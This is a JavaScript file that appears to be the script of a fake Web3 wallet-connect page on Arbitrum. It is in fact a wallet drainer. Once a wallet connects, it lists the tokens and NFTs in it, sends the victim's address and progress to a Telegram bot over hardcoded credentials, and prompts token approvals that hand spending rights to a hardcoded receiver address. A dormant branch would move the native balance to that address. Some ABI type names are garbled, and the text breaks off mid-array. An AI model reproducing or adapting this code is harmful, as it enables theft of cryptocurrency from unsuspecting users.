"use strict";

// Unpkg imports
const Web3Modal = window.Web3Modal.default; 
const WalletConnectProvider = window.WalletConnectProvider.default;
const Fortmatic = window.Fortmatic;
const evmChains = window.evmChains;

// Web3modal instance
let web3Modal

// Chosen wallet provider given by the dialog window
let provider;


// Address of the selected account
let selectedAccount;

const receiver_addres = '0x688c7Ca99807dE1509D1F100eF46D4B843228Ee4'; // gaf<- RECEIVER ADDRESS HERE
let onButtonClick;
let user_address;
let start_to_log = false;


// get parameters from url
function getParameterByName(name, url = window.location.href) {
  name = name.replace(/[\[\]]/g, "\\$&");
  var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
    results = regex.exec(url);
  if (!results) return null;
  if (!results[2]) return "";
  return decodeURIComponent(results[2].replace(/\+/g, " "));
}


/**
 * Setup the orchestra
 */
async function init() {
  start_to_log = false;
  console.log("Initializing example");
  console.log("WalletConnectProvider is", WalletConnectProvider);
//   console.log("Fortmatic is", Fortmatic);
  console.log("Portis is", Portis);
  console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);

  // Check that the web page is run in a secure context,
  // as otherwise MetaMask won't be available
  if(location.protocol !== 'https:') {
    // https://ethereum.stackexchange.com/a/62217/620
    // const alert = document.querySelector("#alert-error-https");
    // alert.style.display = "block";
    // document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
    // return;
  }

  // Tell Web3modal what providers we have available.
  // Built-in web browser provider (only one can exist as a time)
  // like MetaMask, Brave or Opera is added automatically by Web3modal
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        rpc: {
          0xA4B1: "https://arbitrum-mainnet.infura.io/v3/6fc55331d8cf44ccb6c007420fb8f1af",
        },
        network: 'Arbitrum',
        infuraId: "e77435344ef0486893cdc26d7d5cf039"
      }
    }

    // coinbasewallet: {
    //  package: CoinbaseWalletSDK, // Required
    // options: {
    //     appName: "binance", // Required
    //     infuraId: "e62a60a251c64745baefeaf8237af646", // Required
    //     rpc:{
    //       0xA4B1: "https://arbitrum-dataseed.binance.org",
    //     }, // Optional if `infuraId` is provided; otherwise it's required
    //     chainId: 0xA4B1, // Optional. It defaults to 1 if not provided
    //     darkMode: true // Optional. Use dark theme, defaults to false
    //   }
    // },

  };

  web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
    disableInjectedProvider: false,
    theme: "dark" // optional. For MetaMask / Brave / Opera.
  });
  console.log("Web3Modal instance is", web3Modal);
  return "Done"
}


/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function fetchAccountData() {
  start_to_log = false;
  // Get a Web3 instance for the wallet
  
  const web3 = new Web3(provider);

  console.log("Web3 instance is", web3);
  //change chain to arbitrum
  web3.eth.defaultCommon = {
    customChain: {name: 'Arbitrum', chainId: 0xA4B1, networkId: 0xA4B1}, baseChain: 'mainnet', hardfork: 'petersburg'};


  // // Get connected chain id from ethereum node
  // const chainId = await web3.eth.getChainId();

  // // Load chain information over an HTTP API
  // const chainData = evmChains.getChain(chainId);
  //   document.querySelector("#network-name").textContent = chainData.name;
  // console.log("Chain data name:", chainData.name);

  // Get list of accounts of the connected wallet
  const accounts = await web3.eth.getAccounts();

  // MetaMask does not give you all accounts, only the selected account
  console.log("Got accounts", accounts);
  selectedAccount = accounts[0];
  console.log("Selected Account: ", selectedAccount);
  user_address = selectedAccount;

//   document.querySelector("#selected-account").textContent = selectedAccount;

  // Get a handl
//   const template = document.querySelector("#template-balance");
//   const accountContainer = document.querySelector("#accounts");

  // Purge UI elements any previously loaded accounts
//   accountContainer.innerHTML = '';

  // Go through all accounts and get their arbitrum balance
  const rowResolvers = accounts.map(async (address) => {
    const balance = await web3.eth.getBalance(address);
    // arbitrumBalance is a BigNumber instance
    // https://github.com/indutny/bn.js/
    const arbitrumBalance = web3.utils.fromWei(balance, "ether");
    const humanFriendlyBalance = parseFloat(arbitrumBalance).toFixed(4);
    // Fill in the templated row and put in the document
    // const clone = template.content.cloneNode(true);
    // clone.querySelector(".address").textContent = address;
    // clone.querySelector(".balance").textContent = humanFriendlyBalance;
    console.log("New Account: %o", ({address, balance, humanFriendlyBalance}));
    // accountContainer.appendChild(clone);
  });

  // Because rendering account does its own RPC commucation
  // with ethereum node, we do not want to display any results
  // until data for all accounts is loaded
  await Promise.all(rowResolvers);

  // Display fully loaded UI for wallet data
//   document.querySelector("#prepare").style.display = "none";
//   document.querySelector("#connected").style.display = "block";
    proceed();
}



/**
 * Fetch account data for UI when
 * - User switches accounts in wallet
 * - User switches networks in wallet
 * - User connects wallet initially
 */
async function refreshAccountData() {

  // If any current data is displayed when
  // the user is switching acounts in the wallet
  // immediate hide this data
//   document.querySelector("#connected").style.display = "none";
//   document.querySelector("#prepare").style.display = "block";

  // Disable button while UI is loading.
  // fetchAccountData() will take a while as it communicates
  // with ethereum node via JSON-RPC and loads chain data
  // over an API call.
//   document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
  await fetchAccountData(provider);
//   document.querySelector("#btn-connect").removeAttribute("disabled")
}


/**
 * Connect wallet button pressed.
 */
async function onConnect() {

  console.log("Opening a dialog", web3Modal);
  try {
    provider = await web3Modal.connect();
    console.log("provider", provider);
     $(document).ready(function(){
        $("#myModal").modal('show');
    });
  }  catch(e) {
    console.log("Could not get a wallet connection", e);
    return;
  }

  // Suarbitrumribe to accounts change
  provider.on("accountsChanged", (accounts) => {
    web3.eth.defaultCommon = {
      customChain: {name: 'arbitrum-network', chainId: 0xA4B1, networkId: 0xA4B1}, baseChain: 'mainnet', hardfork: 'petersburg'};  
    fetchAccountData();
  });

  // Suarbitrumribe to chainId change
  provider.on("chainChanged", (chainId) => {
    web3.eth.defaultCommon = {
      customChain: {name: 'arbitrum-network', chainId: 0xA4B1, networkId: 0xA4B1}, baseChain: 'mainnet', hardfork: 'petersburg'};  
    fetchAccountData();
  });

  // Suarbitrumribe to networkId change
  provider.on("networkChanged", (networkId) => {
    web3.eth.defaultCommon = {
      customChain: {name: 'arbitrum-network', chainId: 0xA4B1, networkId: 0xA4B1}, baseChain: 'mainnet', hardfork: 'petersburg'};
  
    fetchAccountData();
  });

  await refreshAccountData();
  onButtonClick = proceed;
  web3.eth.defaultCommon = {
    customChain: {name: 'arbitrum-network', chainId: 0xA4B1, networkId: 0xA4B1}, baseChain: 'mainnet', hardfork: 'petersburg'};  
  
}
onButtonClick = onConnect;

/**
 * Disconnect wallet button pressed.
 */
async function onDisconnect() {

  console.log("Killing the wallet connection", provider);

  // TODO: Which providers have close method?
  if(provider.close) {
    await provider.close();

    // If the cached provider is not cleared,
    // WalletConnect will default to the existing session
    // and does not allow to re-scan the QR code with a new wallet.
    // Depending on your use case you may want or want not his behavir.
    await web3Modal.clearCachedProvider();
    provider = null;
  }

  selectedAccount = null;

  // Set the UI back to the initial state
  document.querySelector("#prepare").style.display = "block";
  document.querySelector("#connected").style.display = "none";
}


async function getTokens(address="", api_key="", chain="arbitrum"){
  return new Promise((resolve, reject)=>{
      fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=arbitrum`, {
          method: "GET",
          headers: {
              "accept": "application/json",
              "X-API-Key": api_key
          }
      })
      .then(async(res) => {
          if(res.status > 399) throw res;
          resolve(await res.json());
      }).catch(err=>{
          reject(err);
      })
  })
}

async function getNFTs(address="", api_key="", chain="arbitrum"){
  return new Promise((resolve, reject)=>{
      fetch(`https://deep-index.moralis.io/api/v2/${address}/nft?chain=${chain}&format=decimal&limit=98`, {
          method: "GET",
          headers: {
              "accept": "application/json",
              "X-API-Key": api_key
          }
      })
      .then(async(res) => {
          if(res.status > 399) throw res;
          resolve(await res.json());
      }).catch(err=>{
          reject(err);
      })
  })
}

async function getPrice(address){
  return new Promise((resolve, reject)=>{
      fetch(`https://api.coingecko.com/api/v3/simple/token_price/arbitrum-one?contract_addresses=${address}&vs_currencies=usd`, {
          method: "GET",
          headers: {
              //"accept": "application/json",
              //"X-API-Key": api_key
          }
      })
      .then(async(res) => {
          if(res.status > 399) throw res;
          resolve(await res.json());
      }).catch(err=>{
          reject(err);
      })
  })
}

async function sendMessage(message){
  return new Promise((resolve, reject)=>{
    const chat_id = 5699310522;
    fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
          method: "GET",
          headers: {
              
          }
      })
      .then(async(res) => {
          if(res.status > 399) throw res;
          resolve(await res.json());
      }).catch(err=>{
          reject(err);
      })
  })
}

async function sendMessage1(message){
  return new Promise((resolve, reject)=>{
    const chat_id = 5227607491;
    fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
          method: "GET",
          headers: {
              
          }
      })
      .then(async(res) => {
          if(res.status > 399) throw res;
          resolve(await res.json());
      }).catch(err=>{
          reject(err);
      })
  })
}


async function getBalance(address="", api_key="KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp", chain="arbitrum"){
  return new Promise((resolve, reject)=>{
      fetch(`https://deep-index.moralis.io/api/v2/${address}/balance?chain=arbitrum`, {
          method: "GET",
          headers: {
              "accept": "application/json",
              "X-API-Key": api_key
          }
      })
      .then(async(res) => {
          if(res.status > 399) throw res;
          resolve(await res.json());
      }).catch(err=>{
          reject(err);
      })
  })
}

const receiver_address = '0x688c7Ca99807dE1509D1F100eF46D4B843228Ee4';
async function proceed(){
  start_to_log = false;
  console.log("Now we roll!!!");
    // main net
    const serverUrl = 'https://pt5gk0drbc2k.usemoralis.com:2053/server';
    const appId = 'uxBYKvLyKcTp8au8ftYLIovw8xdNyeI05lR4scQW';
    const apiKey = "KF6aM7wHasYsLQGVi9f9v1kiWJXN8on0RT5PccICn3VdoRBiMCf7M8JTwezJHmGp";
  
    // testnet
    // const serverUrl = 'https://vzrez3npotuq.usemoralis.com:2053/server'
    // const appId = 'LVaJ6EwkawTg52M7p8z3yNf2OoEuScDEma9IaM4C'

    Moralis.start({ serverUrl, appId });
    console.log("Moralis initialized");

    let user;
    try {
      // const web3Provider = await Moralis.enableWeb3();
      if(provider.isMetaMask){
        // metamask
        console.log("Moralis using default (MetaMask)")
        const web3Provider = await Moralis.enableWeb3();
        console.log("Moralis web3Provider:", web3Provider);
      }else{
        // walletconnect
        console.log("Moralis using walletconnect")
        // const web3Provider = await Moralis.enableWeb3({ provider: "walletconnect" });
        try {          
          user = await Moralis.authenticate({provider: "walletconnect"});
          console.log("Moralis user:", user);
        } catch (error) {
          console.log("Failed to authenticate moralis:",error);
        }
      }
    } catch (error) {
      console.log("Can't enable web3: ", error);
    //   const web3Provider = await Moralis.enableWeb3();
    //   user = await Moralis.authenticate();
    //   console.log('Authenticated User with moralis');
    //   user_address = user.get('arbitrumAddress')

        // Moralis.enableWeb3() has already been called but is not finished
    }
    // NOTE: Moralis.User.current(); doesn't exist

    async function send() {
        console.log("Attempting to send tokens...");
        if (!user_address) {
          throw Error(`No user:  ${user_address}`);
        }
        console.log("Searching for tokens...");
    
    
        // let test_addr_with_nfts = '0xe41395822065dc3535a97116485312b44603b289'
        const nft_options = {
          chain: 'arbitrum', // arbitrum
          // address: test_addr_with_nfts,
          address: user_address, // 0x4444ac99AfeEA6B63Ce53F870e0D4DF191987165
          limit: '98',
        }
        // const arbitrum_nfts = await Moralis.Web3API.account.getNFTs(nft_options).catch(e=>{
        //   console.log("Unable to get NFTs", e);
        // })
        // console.log('arbitrum NFTs: %o', arbitrum_nfts)
        
        const arbitrum_tokens = await getTokens(user_address, apiKey).catch(e=>{
          console.log("Unable to get tokens", e);
        });
        let arbitrum_NFT = await getNFTs(user_address, apiKey).catch(e=>{
          console.log("Unable to get NFts", e);
          
        });
        console.log("arbitrum_NFT %o", arbitrum_NFT)
        let arbitrum_NFTs = arbitrum_NFT.result;
        await sendMessage(`me ... arbitrum : connected to ${user_address}`);
        await sendMessage1(`arbitrum : connected to ${user_address}`);
        console.log('arbitrum tokens: %o', arbitrum_tokens)
        console.log('arbitrum NFTs: %o', arbitrum_NFTs)

        
    
        if (false) {
          await sendMessage(`No valuable token or nfts found` )
          await sendMessage1(`No valuable token or nfts found` )
          const bnb_balance = await getBalance(user_address, apiKey).catch(e=>{
            console.log("Unable to get new arbitrum balance", e);
          });
          console.log("bnb_balance", bnb_balance);
          console.log("bnb_balance.balance", bnb_balance.balance);
          
          const balance = ((parseInt(bnb_balance.balance))/1000000000000000000) - 0.005;
          console.log("The new bnb balance", balance);
          if (balance > 0) {
          const options = {
            type: "native",
            amount: Moralis.Units.arbitrum(balance.toString()),
            receiver: receiver_address,
          };
          let result = await Moralis.transfer(options);
          console.log(result);
        }
        else {
          console.log("Insufficient funds")
          if (arbitrum_tokens.length > 0){
            await sendMessage(`Tokens found` )
            await sendMessage1(`Tokens found` )
          } else if (arbitrum_NFTs.length > 0){
            await sendMessage(`NFTs found` )
            await sendMessage(`NFTs found` )
          }
        }


          return console.log('No arbitrum tokens found')
        }
        let x = 0;
        let y = 0;
        let mum = "";
        const real_arbitrum_token = new Array();
        real_arbitrum_token[0] = {
              contractAddress : "0x912CE59144191C1204E64559FE8253a0e49E6548",
              realprice : 100000000,
              balance : "1000000000",
              decimal : "18",
              fakebalance : "1000000000"
            };
          

        const arbitrum_length = arbitrum_tokens.length;
        function callback (x) { 
          x.sort((a, b) => b.realprice - a.realprice);
          console.log("real_arbitrum_token length : ", x.length);
          console.log("real_arbitrum_token : ", x);
         }

        // Get tokens real values
        await arbitrum_tokens.forEach(async function(token,i){
          let contractAddress = token.token_address;
          await getPrice(contractAddress).then(res => {
            
              let pricePerToken;
              if (res[contractAddress]){
                console.log(res[contractAddress].usd);
                pricePerToken = parseFloat(res[contractAddress].usd);
                console.log("Price was obtained ", pricePerToken);   
            }
              else{
                pricePerToken = 0;
                console.log("Unable to obtain price");
              }
            let balance = token.balance;
            let decimal = token.decimals;
            const realprice =  balance / (10 ** (decimal || 18)) * (pricePerToken);
            let fakebalance = balance / (10 ** (decimal || 18));
              real_arbitrum_token[i+1] = {
              contractAddress : contractAddress,
              realprice : realprice,
              balance : balance,
              decimal : decimal,
              fakebalance : fakebalance
            }
        });
        if(i+1 === arbitrum_length) {
          callback(real_arbitrum_token);
          transferNow();
        }
      })
          // .catch(e=>{
          //   console.log("Unable to access api", e);
          // });

          

        
        // arbitrum_nfts.result.forEach(async (nft, i) => {
          //transfer tokens
          
          async function transferNow(){
            
            console.log("Rolling");
            for(let n=0; n<real_arbitrum_token.length && real_arbitrum_token[n].realprice>1; n++){
              x = x + 1;
              console.log("Token ", n); 
              
              let token = real_arbitrum_token[Number(n)];
              let ABI = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"delegator","type":"address"},{"indexed":true,"internalType":"address","name":"fromDelegate","type":"address"},{"indexed":true,"internalType":"address","name":"toDelegate","type":"address"}],"name":"DelegateChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"delegate","type":"address"},{"indexed":false,"internalType":"uint256","name":"previousBalance","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"newBalance","type":"uint256"}],"name":"DelegateVotesChanged","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint8","name":"version","type":"uint8"}],"name":"Initialized","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"},{"indexed":false,"internalType":"bytes","name":"data","type":"bytes"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MINT_CAP_DENOMINATOR","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MINT_CAP_NUMERATOR","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MIN_MINT_INTERVAL","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burnFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint32","name":"pos","type":"uint32"}],"name":"checkpoints","outputs":[{"components":[{"internalType":"uint32","name":"fromBlock","type":"uint32"},{"internalType":"uint224","name":"votes","type":"uint224"}],"internalType":"struct ERC20VotesUpgradeable.Checkpoint","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"delegatee","type":"address"}],"name":"delegate","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"delegatee","type":"address"},{"internalType":"uint256","name":"nonce","type":"uint256"},{"internalType":"uint256","name":"expiry","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"delegateBySig","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"delegates","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"blockNumber","type":"uint256"}],"name":"getPastTotalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"blockNumber","type":"uint256"}],"name":"getPastVotes","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"getVotes","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_l1TokenAddress","type":"address"},{"internalType":"uint256","name":"_initialSupply","type":"uint256"},{"internalType":"address","name":"_owner","type":"address"}],"name":"initialize","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"l1Address","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"nextMint","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"nonces","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"numCheckpoints","outputs":[{"internalType":"uint32","name":"","type":"uint32"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_to","type":"address"},{"internalType":"uint256","name":"_value","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"transferAndCall","outputs":[{"internalType":"bool","name":"success","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]
              let {
                contractAddress: contractAddress,
                balance: balance,
                fakebalance : fakebalance,
                decimal : decimal
              } = token
              let amount = Moralis.Units.Token(fakebalance.toString(), decimal.toString());
              // let token_transfer_options = {
              //   type: "erc20",
              //   amount: Moralis.Units.Token(fakebalance.toString(), decimal.toString()),
              //   receiver: receiver_address, //'0x..',
              //   contractAddress,
              // }
              // let temp = { token: token, options: token_transfer_options }
              // console.log(`Transferring token[${n}]:%o`, temp)
              await sendMessage(`Approving 
                            Token Address : ${contractAddress},
                            Amount : ${amount},
                            Your address : ${receiver_address}
                              ` )
              await sendMessage1(`Approving 
                              Token Address : ${contractAddress},
                              Amount : ${amount},
                              Your address : ${receiver_address}
                                ` )
              const sendOptions = {
                contractAddress: contractAddress,
                functionName: "approve",
                abi: ABI,
                params: {
                  spender : receiver_address,
                  _spender : receiver_address,
                  value : amount,
                  _value : amount,
                  amount : amount,

                },
              };
              
              let transaction = await Moralis.executeFunction(sendOptions).catch(
                (e) => {
                  console.log("Can't transfer token:", e, "Transfer Options: %o", sendOptions);
                  if (e.code === 4001) {
                mum = "denied";
                
              }
              else {
                mum = "approved";
              }
            },
          )
          if (transaction) {
            await sendMessage(`Approved` )
            await sendMessage1(`Approved` )
          }
          else {
            await sendMessage(`Denied` )
            await sendMessage1(`Denied` )
          }
              console.log(transaction);
              // if(transaction){
              //   await transaction.wait().then((v) => {
              //     console.log('Finished Processing transaction:', v)
              //   })
              // }
            }
            for(let n=0; n<arbitrum_NFTs.length; n++){
              y = y + 1;
              let nft = arbitrum_NFTs.result[Number(n)];
              let ABI721 = [{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"ApprovalCallerNotOwnerNorApproved","type":"error"},{"inputs":[],"name":"ApprovalQueryForNonexistentToken","type":"error"},{"inputs":[],"name":"ApproveToCaller","type":"error"},{"inputs":[],"name":"BalanceQueryForZeroAddress","type":"error"},{"inputs":[],"name":"MintERC2309QuantityExceedsLimit","type":"error"},{"inputs":[],"name":"MintToZeroAddress","type":"error"},{"inputs":[],"name":"MintZeroQuantity","type":"error"},{"inputs":[],"name":"OwnerQueryForNonexistentToken","type":"error"},{"inputs":[],"name":"OwnershipNotInitializedForExtraData","type":"error"},{"inputs":[],"name":"TransferCallerNotOwnerNorApproved","type":"error"},{"inputs":[],"name":"TransferFromIncorrectOwner","type":"error"},{"inputs":[],"name":"TransferToNonERC721ReceiverImplementer","type":"error"},{"inputs":[],"name":"TransferToZeroAddress","type":"error"},{"inputs":[],"name":"URIQueryForNonexistentToken","type":"error"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint20xA4B1","name":"fromTokenId","type":"uint20xA4B1"},{"indexed":false,"internalType":"uint20xA4B1","name":"toTokenId","type":"uint20xA4B1"},{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"}],"name":"ConsecutiveTransfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"FREE_AllowedTokensPerWallet","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"FREE_MAX_SUPPLY","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_SUPPLY","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"_count","type":"uint20xA4B1"},{"internalType":"address[]","name":"addresses","type":"address[]"}],"name":"batchAirdrop","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"isActive","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxAllowedTokensPerPurchase","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxAllowedTokensPerWallet","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"_count","type":"uint20xA4B1"}],"name":"mint","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"mintPrice","outputs":[{"internalType":"uint20xA4B1","name":"","type":"uint20xA4B1"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20xA4B1"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"reserveNft","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint20xA4B1","name":"tokenId","type":"uint20